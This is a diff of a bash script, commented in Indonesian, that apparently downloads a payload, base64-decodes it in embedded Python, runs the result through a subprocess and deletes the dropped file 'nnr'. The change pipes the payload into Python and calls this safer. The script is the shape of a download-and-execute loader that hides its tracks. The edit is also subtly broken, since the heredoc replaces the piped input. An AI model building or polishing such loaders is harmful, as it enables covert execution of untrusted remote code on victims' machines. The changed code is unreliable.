@@ -9,13 +9,12 @@ fi
 
 echo "Payload downloaded (length: ${#_PAYLOAD})"
 
-# Gunakan Python untuk decrypt dan execute
-python3 <<'EOF'
+# Kirim payload ke Python via pipe (lebih aman)
+echo "$_PAYLOAD" | python3 <<'PYTHON_SCRIPT'
 import base64, os, subprocess, sys
 
-# Data dari bash
-data = sys.argv[1] if len(sys.argv) > 1 else open('/dev/stdin').read()
-data = data.strip()
+# Baca dari stdin
+data = sys.stdin.read().strip()
 
 try:
     decoded = base64.b64decode(data)
@@ -44,4 +43,4 @@ if result.stderr:
     print(result.stderr, file=sys.stderr)
 
 os.unlink('nnr')
-EOF "$_PAYLOAD"
+PYTHON_SCRIPT
